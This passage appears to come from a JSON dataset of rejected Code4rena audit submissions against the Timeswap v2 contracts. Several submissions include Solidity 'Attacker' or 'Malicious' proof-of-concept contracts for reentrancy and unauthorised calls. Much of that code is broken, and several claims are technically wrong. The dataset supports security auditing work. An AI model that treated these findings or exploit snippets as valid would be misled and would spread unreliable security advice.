Solidity.\n\n## Tools Used\n\nManual review, Remix IDE\n\n## Recommended Mitigation Steps\n\nSome specific steps that can be taken to mitigate this vulnerability:\n\n1. Update the solidity version of the contract to a version that supports the \"delete\" keyword. The current version of solidity is 0.8.12, this version support the delete keyword.\n\n2. Replace the \"delete\" keyword with an alternative method of zeroing out the storage variable. For example, you can set the variable to 0 or to an empty value(if it is a string or an array)\n\n3. Test the contract thorou"
+    },
+    {
+      "number": 80,
+      "title": "Reentrancy Vulnerability in No Delegate Call Contract",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-option/src/TimeswapV2Option.sol#L10\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-option/src/TimeswapV2Option.sol#L32\n\n\n# Vulnerability details\n\n## Impact\n\nThis vulnerability can allow an attacker to repeatedly call the contract in a malicious way that could potentially cause an infinite loop and exhaust the contract's gas or cause other unintended behaviors. This can lead to the contract being unable to perform its intended functions and could potentially result in the loss of funds or other assets stored in the contract.\n\n\n## Proof of Concept\n\nTo demonstrate the vulnerability, an attacker could create a malicious contract that calls the TimeswapV2Option contract's public functions, and within those functions, the attacker's contract calls itself again before the initial call has completed. This way the attacker's contract can repeatedly call the vulnerable contract and potentially drain its balance or manipulate its state.\n\n## Tools Used\n\nManual review\n\n## Recommended Mitigation Steps\n\nA plan for this vulnerability would be to implement a reentrancy guard, such as a \"mutex\", to prevent malicious actors from repeatedly calling the contract in a loop before any state changes are made. This can be done by adding a \"boolean\" variable, such as \"isProcessing,\" that is set to true before any state-modifying functions are called and set to false after they have been completed. Additionally, any state-modifying functions should check this variable before executing and return without modifying the state if it is set to true. This would prevent a malicious actor from repeatedly calling the contract and modifying the state before the first call has been completed.\n"
+    },
+    {
+      "number": 63,
+      "title": "TimeswapV2Pool.sol: The transferLiquidity() function does not verify the available liquidity in the pool",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/TimeswapV2Pool.sol#L152-L162\n\n\n# Vulnerability details\n\n## Impact\nThe transferLiquidity() function does not check if the liquidityAmount variable is greater than the available liquidity in the pool.\nA caller can enter a liquidityAmount value which is greater than the available liquidity in the pool and this could lead to an unexpected behavior.\n\n\n## Proof of Concept\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/TimeswapV2Pool.sol#L152-L162\n\n\n## Recommended Mitigation Steps\nVerify whether the liquidityAmount is lower or equal to the available liquidity in the pool.\n"
+    },
+    {
+      "number": 62,
+      "title": "TimeswapV2Pool.sol: The collectTransactionFees() function does not verify the msg.sender",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/TimeswapV2Pool.sol#L202-L220\n\n\n# Vulnerability details\n\n## Impact\nThe collectTransactionFees() function does not check the msg.sender address, meaning that anyone can collect the transaction fees for themselves, regardless of whether or not they are the rightful owner of the positions.\n\n\n## Proof of Concept\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/TimeswapV2Pool.sol#L202-L220\n\n\n## Recommended Mitigation Steps\n\nCheck if the msg.sender is authorized to call that function"
+    },
+    {
+      "number": 60,
+      "title": "Endless List Growth, the Unbounded Array Vulnerability in TimeswapV2Option Contract",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-option/src/TimeswapV2Option.sol#L59\n\n\n# Vulnerability details\n\n## Impact\n\n```\nlistOfOptions.push(StrikeAndMaturity({strike: strike, maturity: maturity}));\n```\nin the function `addOptionEnumerationIfNecessary`, which is called in multiple other functions. This line of code pushes a new option to the `listOfOptions` array, but there is no mechanism to prevent the array from growing indefinitely which could cause out-of-gas issues or other problems.\n\nCan lead to several issues, the most notable of which is the potential for an `out-of-gas exception`. An `out-of-gas exception` occurs when a transaction runs out of gas before it is able completed. In this case, if the `listOfOptions` array grows too large, it can consume all of the available gas during a transaction, causing it to fail with an out-of-gas exception. \n\n\n## Proof of Concept\n\nAn attacker could exploit this vulnerability by repeatedly calling the `addOptionEnumerationIfNecessary` function, causing the `listOfOptions` array to grow indefinitely.\n\nCode.\n\n```\npragma solidity =0.8.8;\n\ncontract Attacker {\n    function attack(address target) public {\n        for (uint i = 0; i < 10**20; i++) {\n            TimeswapV2Option(target).addOptionEnumerationIfNecessary(i, i);\n        }\n    }\n}\n```\nThis attacker contract calls the `addOptionEnumerationIfNecessary` function in a loop, passing a different strike and maturity value each time. Because there is no mechanism to prevent the array from growing indefinitely, this will cause the `listOfOptions` array to grow indefinitely, consuming all the available gas and causing the transaction to fail with an `out-of-gas` exception.\n\n## Tools Used\n\nManual audit, Vs Code, Remix.\n\n## Recommended Mitigation Steps\n\nOne approach is to add a mechanism that limits the size of the `listOfOptions` array. For example, a maximum size can be set, and a check can be added "
+    },
+    {
+      "number": 59,
+      "title": "Lack of reentrancy protection in smart contract using NoDelegateCall, TimeswapV2Option.",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-option/src/TimeswapV2Option.sol#L10\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-option/src/TimeswapV2Option.sol#L32\n\n\n# Vulnerability details\n\n## Impact\n\nContract uses the `NoDelegateCall` contract.\n\n```\nimport {NoDelegateCall} from \"./NoDelegateCall.sol\";\n...\ncontract TimeswapV2Option is ITimeswapV2Option, NoDelegateCall {\n```\nImport and use of the `NoDelegateCall` contract do not offer any protection against reentrancy attacks.\n\nHowever, it does not provide any protection against reentrancy attacks. This means that an attacker can potentially call a function in the contract, and before the state of the contract is updated, they can call the same function repeatedly to exploit the contract.\n\n## Proof of Concept\n\n```\npragma solidity =0.8.8;\n\ncontract Malicious {\n    address payable public victim;\n\n    function attack() public payable {\n        // Send some ether to the vulnerable contract\n        victim.transfer(msg.value);\n\n        // Call the vulnerable contract's function multiple times before the state is updated\n        victim.call.value(msg.value)(bytes4(keccak256(\"functionName()\")));\n        victim.call.value(msg.value)(bytes4(keccak256(\"functionName()\")));\n        victim.call.value(msg.value)(bytes4(keccak256(\"functionName()\")));\n    }\n}\n```\nThe malicious contract first sends some `ether` to the vulnerable contract and then calls the vulnerable contract's function multiple times before the state is updated. This can be exploited to extract a large `amount` of assets from the contract.\n\n## Tools Used\n\nManual audit, Vs Code.\n\n## Recommended Mitigation Steps\n\nAdditional measures such as using a `mutex` pattern or the use of the `ReentrancyGuard` library should be implemented to protect against reentrancy attacks.\n\nCode.\n```\npragma solidity =0.8.8;\n\ncontract MutexV2Option {\n    bool"
+    },
+    {
+      "number": 56,
+      "title": "Unauthorized Execution of Create Function in TimeswapV2PoolFactory Contract",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2PoolFactory.sol#L59-L70\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2PoolFactory.sol#L69\n\n\n# Vulnerability details\n\n## Impact\n```\nfunction create(address optionPair) external override returns (address pair) {\n    if (optionPair == address(0)) Error.zeroAddress();\n    pair = pairs[optionPair];\n    if (pair != address(0)) Error.zeroAddress();\n    pair = deploy(address(this), optionPair, transactionFee, protocolFee);\n    pairs[optionPair] = pair;\n    emit Create(msg.sender, optionPair, pair);\n}\n```\n```   emit Create(msg.sender, optionPair, pair); ```\n\nSpecifically, the lines that do not check if `msg.sender` is authorized to execute the function, any address can execute the function. This can have a serious impact on the security and functionality of the contract.\n\nIt can lead to `unauthorized` creation of option pairs, potentially exhausting resources, and allowing attackers to make unauthorized changes to the contract's state.\n\nIf the attacker is able to create option pairs with malicious intent, such as using them for `illicit activities`, it could lead to reputational damage for the contract and its users.\n\n## Proof of Concept\n\nAn attacker could exploit this vulnerability by calling the `create` function of the `TimeswapV2PoolFactory` contract from any Ethereum address. \n\nProof of concept code for this exploit.\n\n```\n// Attacker's address\naddress attacker = 0x123456789abcdef01234567890abcdef01234567;\n\n// TimeswapV2PoolFactory contract address\naddress factory = 0x9876543210fedcba9876543210fedcba98765432;\n\n// Option pair address to be created\naddress optionPair = 0x1111111111111111111111111111111111111111;\n\n// Call the \"create\" function from the attacker's address\nfactory.create(optionPair);\n```\n\n The attacker's address is `0x123456789abcdef01234567890"
+    },
+    {
+      "number": 49,
+      "title": "Library Not Checking for `msg.sender` or `msg.data` Modification.",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory",
+        "edited-by-warden"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2Pool.sol#L252-L257\n\n\n# Vulnerability details\n\n## Impact\n```solidity\nfunction mint(\n    TimeswapV2PoolMintParam calldata param,\n    bool isQuote,\n    uint96 durationForward\n) private noDelegateCall returns (uint160 liquidityAmount, uint256 long0Amount, uint256 long1Amount, uint256 shortAmount, bytes memory data) {\n```\nThe contract uses the `NoDelegateCall` library to prevent `delegatecall` attacks, however, it does not check if the `msg.sender` or the `msg.data` have been modified before the internal call. This means that an attacker could potentially modify the `msg.sender` or `msg.data` before the internal call, allowing them to perform a `delegatecall` attack. \n\n## Proof of Concept\n\nAttacker will create a malicious contract that modifies the `msg.sender` or `msg.data` before calling the vulnerable contract's internal function. This would then allow the attacker to execute malicious code within the context of the vulnerable contract or call external contracts in an unintended way.\n\n### Code Snippet.\n```solidity\npragma solidity ^0.8.0;\n\ncontract Attacker {\n    address victim;\n    bytes memory maliciousData;\n\n    constructor(address _victim) public {\n        victim = _victim;\n    }\n\n    function executeAttack() public {\n        // Modify msg.sender\n        address originalSender = msg.sender;\n        msg.sender = address(this);\n\n        // Modify msg.data\n        bytes memory originalData = msg.data;\n        maliciousData = new bytes(originalData.length);\n        assembly {\n            mstore(add(maliciousData, 0x20), originalData)\n        }\n        msg.data = maliciousData;\n\n        // Perform the internal call\n        victim.delegatecall(msg.data);\n\n        // Revert the changes to msg.sender and msg.data\n        msg.sender = originalSender;\n        msg.data = originalData;\n    }\n}\n```\nThe Attacker contract is able to modify t"
+    },
+    {
+      "number": 46,
+      "title": "Callback function implementation check missing in \"mint\" function",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2Pool.sol#L277-L287\n\n\n# Vulnerability details\n\n## Impact\n\n`mint` function in the smart contract uses a callback function, `ITimeswapV2PoolMintCallback(msg.sender).timeswapV2PoolMintCallback()`, to ask the `msg.sender` to transfer positions into the contract address. However, it does not check if the callback function is implemented by the `msg.sender` contract. If the `msg.sender` contract does not implement the callback, the function will throw an exception.\n\nThis will cause the `mint` function to fail, preventing users from depositing positions into the pool and minting liquidity. This can also cause the smart contract to enter an error state and stop functioning properly.\n\nFurthermore, an attacker can exploit this vulnerability by creating a malicious contract that doesn't implement the callback function and calling the mint function. This can cause the smart contract to fail, preventing legitimate users from using the mint function, and can cause a loss of funds.\n\n## Proof of Concept\n\nAttacker can exploit this vulnerability by creating a malicious contract that does not implement the required `callback` function `ITimeswapV2PoolMintCallback.timeswapV2PoolMintCallback()` and then calling the `mint` function of the smart contract while sending transactions from the malicious contract.\n\nCode.\n```\ncontract Malicious {\n    function attack() external {\n        // call the \"mint\" function of the target contract\n        // without implementing the required callback function\n    }\n}\n```\nWhen the `mint` function is called, it will call the callback function on the `msg.sender` contract, but since the malicious contract does not implement the callback function, the function will throw an exception and the smart contract will enter an error state.\n\nThis can cause the `mint` function to fail, preventing legitimate users from depositing p"
+    },
+    {
+      "number": 45,
+      "title": "Missing Authorization Check in \"collect\" function for Position Transfer.",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2Pool.sol#L231-L237\n\n\n# Vulnerability details\n\n## Impact\n`collect` function does not check if the `msg.sender` has the authority to collect positions from the pool, it should check if `msg.sender` is the owner of the `positions`.\n\n```\nfunction collect(uint256 strike, uint256 maturity, address long0To, address long1To, address shortTo, uint256 long0Amount, uint256 long1Amount, uint256 shortAmount) private {\n    if (long0Amount != 0) ITimeswapV2Option(optionPair).transferPosition(strike, maturity, long0To, TimeswapV2OptionPosition.Long0, long0Amount);\n\n    if (long1Amount != 0) ITimeswapV2Option(optionPair).transferPosition(strike, maturity, long1To, TimeswapV2OptionPosition.Long1, long1Amount);\n\n    if (shortAmount != 0) ITimeswapV2Option(optionPair).transferPosition(strike, maturity, shortTo, TimeswapV2OptionPosition.Short, shortAmount);\n}\n```\nThe function does not check if the `msg.sender` has the authority to collect positions from the pool, it directly calls the `transferPosition` function on the ITimeswapV2Option contract. It should check if the `msg.sender` is the owner of the positions by calling the `require(msg.sender == owner)` before calling the `transferPosition` function.\n\n## Proof of Concept\n\nFor exploiting this vulnerability would involve.\n\n    The attacker would need to find a pool that has some positions that the attacker does not own. The attacker can use the `ITimeswapV2Option.positionOf()` function to check the ownership of positions in a pool.\n\n    The attacker would then call the `collect()` function on the `TimeswapV2Pool` contract, passing in the strike, maturity, and the address they want to transfer the positions `to`. The attacker can use the `long0Amount`, `long1Amount`, and `shortAmount` parameters to specify the number of positions they want to transfer.\n\nCode.\n```\nfunction exploit(address pool, uint"
+    },
+    {
+      "number": 42,
+      "title": "Lack of Reentrancy protection in deploy function. `TimeswapV2PoolDeployer`",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2PoolDeployer.sol#L25-L31\n\n\n# Vulnerability details\n\n## Impact\n\n```\nfunction deploy(address poolFactory, address optionPair, uint256 transactionFee, uint256 protocolFee) internal returns (address poolPair) {\n        parameter = Parameter({poolFactory: poolFactory, optionPair: optionPair, transactionFee: transactionFee, protocolFee: protocolFee});\n\n        poolPair = address(new TimeswapV2Pool{salt: keccak256(abi.encode(optionPair))}());\n\n        delete parameter;\n    }\n```\n`deploy` function does not have any protection against `reentrancy attacks`, which means a \"malicious\" contract could call the deploy function multiple times before it has a chance to `delete the parameter struct`. This vulnerability can allow an attacker to repeatedly call the `deploy function and deploy multiple contracts`, leading to unexpected behavior and loss of funds.\n\n## Proof of Concept\n\nAn attacker can create a malicious contract that calls the `deploy` function of the `TimeswapV2PoolDeployer` contract repeatedly before it has a chance to delete the parameter struct.\n\nCode.\n```\npragma solidity = 0.8.8;\n\ncontract Malicious {\n    TimeswapV2PoolDeployer public timeswapV2PoolDeployer;\n\n    constructor(address _timeswapV2PoolDeployer) public {\n        timeswapV2PoolDeployer = TimeswapV2PoolDeployer(_timeswapV2PoolDeployer);\n    }\n\n    function exploit() public {\n        while (true) {\n            timeswapV2PoolDeployer.deploy(address(0x0), address(0x0), 0, 0);\n        }\n    }\n}\n```\nThe Malicious contract takes in the address of the `TimeswapV2PoolDeployer` contract during the constructor and assigns it to the public variable `timeswapV2PoolDeployer`. The exploit function is then called, which repeatedly calls the `deploy` function of the `TimeswapV2PoolDeployer` contract before it has a chance to delete the parameter struct, causing multiple instances of "
+    },
+    {
+      "number": 41,
+      "title": "Lack of Input Validation on `poolFactory` address not checked for contract validation.",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory",
+        "edited-by-warden"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2PoolDeployer.sol#L25-L26\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2PoolDeployer.sol#L26\n\n\n# Vulnerability details\n\n## Impact\n```solidity\nfunction deploy(address poolFactory, address optionPair, uint256 transactionFee, uint256 protocolFee) internal returns (address poolPair) {\n        parameter = Parameter({poolFactory: poolFactory, optionPair: optionPair, transactionFee: transactionFee, protocolFee: protocolFee});\n```\n```solidity\nparameter = Parameter({poolFactory: poolFactory, optionPair: optionPair, transactionFee: transactionFee, protocolFee: protocolFee});\n```\nHere the input parameters are assigned without any validation, allowing any address to be passed as the `poolFactory` address, even if it's not a valid contract address.\n\n\nIt allows a malicious attacker to pass an arbitrary address as the `poolFactory` address, potentially leading to unexpected behavior and loss of funds. An attacker can pass their own address as the `poolFactory` address, allowing them to gain control of the deployed contract and steal funds from the deployed contract.\n\n## Proof of Concept\n\nWe'll start by creating a malicious contract that calls the `deploy` function of the `TimeswapV2PoolDeployer` contract with an arbitrary address as the `poolFactory` parameter.\n\nCode.\n```solidity\npragma solidity = 0.8.8;\n\ncontract Malicious {\n    TimeswapV2PoolDeployer public timeswapV2PoolDeployer;\n\n    constructor(address _timeswapV2PoolDeployer) public {\n        timeswapV2PoolDeployer = TimeswapV2PoolDeployer(_timeswapV2PoolDeployer);\n    }\n\n    function exploit() public {\n        address maliciousAddress = address(this);\n        timeswapV2PoolDeployer.deploy(maliciousAddress, address(0x0), 0, 0);\n    }\n}\n```\nThe Malicious contract takes in the address of the `TimeswapV2PoolDeploy"
+    },
+    {
+      "number": 37,
+      "title": "Some token pair pools can never be created",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory",
+        "edited-by-warden"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-option/src/TimeswapV2OptionDeployer.sol#L32-L35\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2PoolDeployer.sol#L25-L29\n\n\n# Vulnerability details\n\n## Impact\nwhen try to deploy pool or option contract if created address has been deployed before, there is no chance to create this pair.\n## Proof of Concept\nDue to creation of pool and option contracts are deterministic and there is no chance to create with different address in optionFactory and deploymentFactory contracts,it may  behave unexpected in future because of the generated address has probably been created in ethereum chain before by someone.This situation cause EVM error revert. At that position there is no mechanism to deploy with different address so desired pair pool or option contract can't be created in any way.\nThis issue discussed in https://github.com/ethereum/EIPs/issues/684.\n## Tools Used\n\n## Recommended Mitigation Steps\nCan be given  permission to owner for change create mechanism if creating of specific pair is reverted. Another way is use  a nonce value.Start with 0 and if contract creation is reverted increase nonce value 1.\nThere is a exapmle code for using nonce escape mechanism.\nhttps://imgur.com/sTa3Vwd"
+    },
+    {
+      "number": 29,
+      "title": "Brute Force Attack Vulnerability in Reentrancy Guard Key Generation",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-token/src/TimeswapV2Token.sol#L46\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-token/src/TimeswapV2Token.sol#L53\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-token/src/TimeswapV2Token.sol#L61\n\n\n# Vulnerability details\n\n## Impact\n\n```\nbytes32 key = keccak256(abi.encode(token0, token1, strike, maturity));\n```\nIn the `raiseGuard()` function and the `lowerGuard()` function.\n\n```\nfunction raiseGuard(address token0, address token1, uint256 strike, uint256 maturity) private {\n        bytes32 key = keccak256(abi.encode(token0, token1, strike, maturity));\n\n        reentrancyGuards[key].check();\n        reentrancyGuards[key] = ReentrancyGuard.ENTERED;\n    }\n```\n\n```\nfunction lowerGuard(address token0, address token1, uint256 strike, uint256 maturity) private {\n        bytes32 key = keccak256(abi.encode(token0, token1, strike, maturity));\n        reentrancyGuards[key] = ReentrancyGuard.NOT_ENTERED;\n    }\n```\n\nThis vulnerability could allow an attacker to bypass the reentrancy guard and potentially exploit the contract in unexpected ways beyond imagination, is caused by the use of the keccak256 function to generate the `reentrancyGuards` key. The key is generated by taking the `abi-encoded` values of token0, token1, strike, and maturity and passing them through the keccak256 function. However, since keccak256 is a deterministic function, it is possible for an attacker to brute force the key and call the function again.\n\nThe key is used to track the state of the `reentrancy guard` for the contract and is used in the `raiseGuard()` and `lowerGuard()` functions. If an attacker is able to brute force the key, they can call the function again, potentially allowing them to bypass the reentrancy guard and call other functions in the contract multi"
+    },
+    {
+      "number": 25,
+      "title": "anyone can burn tokens in TimeswapV2LiquidityToken.sol",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-token/src/TimeswapV2LiquidityToken.sol#L150-L179\n\n\n# Vulnerability details\n\n## Impact\nAnyone can burn tokens in TokenswapV2LiquidityToken.sol. I believe it is assumed that most critical functions in TimeswapV2LiquidityToken.sol can only be called by Liquidity Providers. But there is no check/protection to ensure that.\n\n## Proof of Concept\nThe External function burn() is accessible by everyone.\n\n## Tools Used\nManual Review.\n\n## Recommended Mitigation Steps\nput a check to ensure that minting can only be carried out by the liquidity Providers."
+    },
+    {
+      "number": 23,
+      "title": "Anyone can use the external function transferTokenPositionFrom() not only the liquidity provider",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-token/src/TimeswapV2LiquidityToken.sol#L70-L72\n\n\n# Vulnerability details\n\n## Impact\nAnyone can use this critical external function transferTokenPositionFrom() found in TimeswapV2LiquidityToken.sol.\nThis function was meant to be used by only the liquidity providers. It transfers the position of tokens used by liquidity providers to add liquidity to pools. \nso anyone can transfer the position of these tokens from one address to another.\n\n## Proof of Concept\nThe critical external function is accessible to everyone.\n\n## Tools Used\nManual Review.\n\n## Recommended Mitigation Steps\nput a restriction to make the function solely accessible to the liquidity providers alone."
+    },
+    {
+      "number": 22,
+      "title": "Anyone can earn the transaction fees not only Liquidity Providers.",
+      "labels": [
+        "invalid",
+        "3 (High Risk)",
+        "withdrawn by warden"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-token/src/TimeswapV2LiquidityToken.sol#L75-L96\n\n\n# Vulnerability details\n\n## Impact\nin TimeswapV2LiquidityToken.sol, the external function transferFeesFrom() is not protected to make sure that it's only accessible to the liquidity providers.\nTherefore anyone under the guise of msg.sender can call it and earn/transfer the transaction fees meant only for the liquidity providers to themselves.\n\n## Proof of Concept\nPraise a hacker notices that transferFeesFrom isn't strictly restricted to the liquidity providers and can be called by the msg.sender. \nPraise then calls the external function transferFeesFrom externally from another function with this.myFunc(), which allows him to change the msg.sender from the account that signed the transaction to the contract itself.\nHe then transfers all the fees to himself.\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nPut a Restriction on this function to make it strictly accessible only to the liquidity providers, not just msg.senders.\nHere is what i mean, you can create another contract specifically representing Liquidity Providers and strictly restrict the accessibility of external functions like transferFeesFrom to it. \nOr put a check to make sure that only EOA's can call it and not contracts. "
+    },
+    {
+      "number": 18,
+      "title": "TimeswapV2Pool functions can reentrant even there is raiseGuard",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory",
+        "edited-by-warden"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/TimeswapV2Pool.sol#L277\n\n\n# Vulnerability details\n\n## Impact\nThe reentrancy protection on TimeswapV2Pool of mint, burn, leverage and deleverage can reentrant and attacker may mint more than what he was supposed to mint\n\n## Proof of Concept\nThe TimeswapV2Pool. deleverage function (taking that function as example for the report) works that way, \nit first raises the reentrancy guard on the provided `param.strike` and `param.maturity` \n\n```\nraiseGuard(param.strike, param.maturity);\n```\n\nthen it made the deleveragation call :\n\n```\n               (long0Amount, long1Amount, shortAmount, data) = pools[param.strike][param.maturity].deleverage(param, transactionFee, protocolFee, blockTimestamp(durationForward));\n\n\n        ITimeswapV2Option(optionPair).transferPosition(param.strike, param.maturity, param.to, TimeswapV2OptionPosition.Short, shortAmount);\n\n\n        ...etc\n\n```\n\nafter that it makes a call to msg.sender to transfer the position to address(this) :\n\n```\n data = ITimeswapV2PoolDeleverageCallback(msg.sender).timeswapV2PoolDeleverageCallback(\n            TimeswapV2PoolDeleverageCallbackParam({strike: param.strike, maturity: param.maturity, long0Amount: long0Amount, long1Amount: long1Amount, shortAmount: shortAmount, data: data})\n        );\n```\n\nonce done the reentrancy guard will lower reentrancy of the provided `param.strike` and `param.maturity`,\nAttacker can make a reentrancy using the following scenario :\n\n1. Calls TimeswapV2Pool. deleverage with param.strike X and param.maturity X\n2. the function will makes the positionsOf calls to optionPair, then it will calls to `msg.sender` to transfer the positions into this address.\n3. as mentioned in the comment // Ask the msg.sender to transfer the positions into this address (line 402)\n4. the msg.sender is contract, and the fallback calls the TimeswapV2Pool.deleverage (or even other functions as such TimeswapV2Pool.mint) with pa"
+    },
+    {
+      "number": 5,
+      "title": "LENDERS/BORROWERS CAN CREATE POOLS AS LIQUIDITY PROVIDERS, MANIPULATE LENDING/BORROWING POSITIONS AND PAY TRANSACTION FEES TO THEMSELVES",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory",
+        "edited-by-warden"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2PoolFactory.sol#L59-L70\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2PoolDeployer.sol#L25-L31\n\n\n# Vulnerability details\n\n## Impact\nAccording to the whitepaper only liquidity providers should be able to create pools.\nbut here a lender or borrower can create a pool as a liquidity provider and manipulate lending positions/borrowing positions to be in their favor. \nAnd also pay transaction fees to themselves.\n\n## Proof of Concept\nThere's no check to make sure only Liquidity Providers can create pools as stated in the whitepaper.\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nadd a form of protection to ensure that both internal function deploy() in TimeswapV2PoolDeployer.sol and external function create() in TimeswapV2PoolFactory.sol which calls the internal function deploy(), can be used by only Liquidity providers, i.e make a check to ensure that anyone who creates a pool as a Liquidity Provider won't be able to be a lender or borrower anymore."
+    }
+  ]
+}
